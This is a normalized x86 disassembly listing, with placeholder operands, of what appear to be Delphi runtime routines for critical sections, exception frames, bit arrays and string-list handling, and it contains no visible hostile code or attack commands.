retn
dec edi
mov edx ebp
mov eax ebx
call sub_413c5c
dec ebp
inc edi
jne r-xdata
sub_413f80
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030d4
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_413fd4
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403490
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4140d8
xor eax eax
push ebp
push sub_414036
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_403104
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4030f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41403d
mov eax [ ebp - 0x4 ]
call sub_41413c
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_414050
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4140d8
xor eax eax
push ebp
push sub_4140cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413c10
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413dc8
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4140d3
mov eax [ ebp - 0x4 ]
call sub_41413c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_413cf8
sub_4140ec
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4140d8
xor eax eax
push ebp
push sub_41412f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413eb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414136
mov eax [ ebp - 0x4 ]
call sub_41413c
retn
sub_414148
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41419c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_41419c
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_414178
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026bc
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402b18
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_4026dc
mov edx edi
mov eax ebp
call sub_414190
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028b8
sub_414240
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_414178
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_41419c
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_414284
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_4142fc
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax esi
call sub_416b24
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_41433c
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4143f2
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403eec
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403054
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4040b8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403054
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b618
call sub_403890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4143f9
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_414418
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4144ad
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403054
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_4040b8
mov eax ebx
mov si 0xffff
call sub_403300
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4144b4
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
mov eax ebx
mov si 0xffff
call sub_403300
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403300
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_4041d4
sub_4144bf
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403358
mov eax ebx
mov si 0xffff
call sub_403300
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403300
push eax
lea eax [ ebx + 0x4 ]
call sub_4054f4
mov ecx eax
mov edx r-xdata
pop eax
call sub_4031b8
sub_41450a
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_41453c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_41455c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4031b8
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_414584
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_4145a4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_4145fe
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_413e54
call sub_403104
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_41460c
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_415164
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4142fc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_41463c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414660
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_414684
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41472b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4147d4
xor eax eax
push ebp
push sub_41470e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414715
mov eax [ ebp - 0x4 ]
call sub_414890
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_41473c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_414328
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4147d4
xor eax eax
push ebp
push sub_4147bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414890
retn
sub_4147ec
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4148a4
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_414844
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_414ffc
mov eax [ ebp - 0x8 ]
push eax
push sub_4152ac
push ebp
call sub_4147ec
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4148a4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414939
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414940
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403e78
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_404260
jne r-xdata
sub_414950
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_41494c
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b55c
jmp sub_403890
sub_414988
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4149d0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4059b8
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_414950
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4149d7
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_4149e0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414ab8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4147d4
xor eax eax
push ebp
push sub_414a96
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414a9d
mov eax [ ebp - 0x4 ]
call sub_414890
retn
sub_414ad4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_414b19
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404314
call sub_408724
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b20
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_414b28
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414c33
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_403eec
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_403f44
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c3a
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403e78
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_404114
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_404114
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_404114
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028b8
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028b8
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_404114
mov ebx eax
test ebx ebx
je r-xdata
sub_414c50
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_414cc8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414ccf
lea eax [ ebp - 0xc ]
call sub_403e54
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_414cdc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_414d9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404374
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_41533c
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_40403c
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c23c
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414da6
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403e78
lea eax [ ebp - 0xc ]
call sub_403e54
retn
sub_414db0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_414de4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_414e14
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415e78
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414e5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414e63
mov eax [ ebp - 0x4 ]
call sub_403104
retn
sub_414e68
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414f05
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4147d4
xor eax eax
push ebp
push sub_414ee8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_4159c4
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_403f44
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414eef
mov eax [ ebp - 0x4 ]
call sub_414890
retn
sub_414f14
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414fb5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414fbc
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
mov eax [ ebp - 0x4 ]
call sub_4147d4
xor eax eax
push ebp
push sub_414f98
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414890
retn
sub_414fc4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414ffc
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4150a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_417ce4
mov eax [ ebp - 0x4 ]
call sub_4147d4
xor eax eax
push ebp
push sub_41507b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_416d80
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418984
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415082
mov eax [ ebp - 0x4 ]
call sub_414890
retn
sub_4150ac
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415e78
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4150f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4150fe
mov eax [ ebp - 0x4 ]
call sub_403104
retn
sub_415104
